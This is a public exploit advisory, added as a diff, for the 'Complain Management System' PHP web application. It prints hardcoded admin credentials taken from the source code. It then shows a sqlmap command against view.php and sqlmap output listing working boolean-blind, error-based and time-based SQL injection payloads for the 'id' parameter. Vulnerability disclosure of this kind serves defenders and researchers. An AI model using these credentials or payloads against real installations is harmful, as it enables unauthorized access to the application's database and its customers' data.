@@ -1,0 +1,58 @@
+# Exploit Title : Complain Management System Blind SQL Injection
+# Date: 10 October 2017
+# Exploit Author: havysec 
+# Tested on: ubuntu14.04
+# Vendor: https://sourceforge.net/projects/complain-management-system/
+# Version: not supplied
+# Download Software: https://sourceforge.net/projects/complain-management-system/files
+  
+ 
+## About The Product :
+Complain Management is a Web based project used to manage Customer's complain Online. User can login, and Create complain, view complain details and track the status of its complain.
+ 
+## Vulnerability :
+The functions.php file line 88 has hardcoded admin credentials.
+        elseif($uType == 'admin'){
+            //$_SESSION['user_id'] = $row['sid'];
+            if($userName == 'admin' && $password == 'admin123'){
+                $_SESSION['user_id'] = 0;
+                $_SESSION['user_name'] = 'Administrator';
+                $_SESSION['user_type'] = 'admin';
+                header('Location: '.WEB_ROOT.'index.php');
+                exit;
+ 
+Using the hardcoded admin credentials we then have access to the view.php file that is vulnerable to Blind SQL injection.
+ 
+-HTTP Method : GET
+ 
+- Sqlmap command: sqlmap -u 'http://192.168.1.104/view.php?mod=admin&view=repod&id=plans' --cookie="PHPSESSID=t1bc9vj67odrj3bd096g0rffe0"
+ 
+- Sqlmap Output : 
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
+[00:47:53] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[00:47:53] [INFO] testing 'MySQL UNION query (98) - 22 to 40 columns'
+[00:47:53] [INFO] testing 'MySQL UNION query (98) - 42 to 60 columns'
+[00:47:53] [INFO] testing 'MySQL UNION query (98) - 62 to 80 columns'
+[00:47:54] [INFO] testing 'MySQL UNION query (98) - 82 to 100 columns'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 650 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: mod=admin&view=repod&id=plans WHERE 6586=6586 AND 9310=9310#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: mod=admin&view=repod&id=plans WHERE 3317=3317 AND (SELECT 4063 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT (ELT(4063=4063,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- 
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: mod=admin&view=repod&id=plans WHERE 4122=4122 AND (SELECT * FROM (SELECT(SLEEP(5)))zWVH)-- 
+---
+[00:47:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0
+[00:47:57] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 444 times
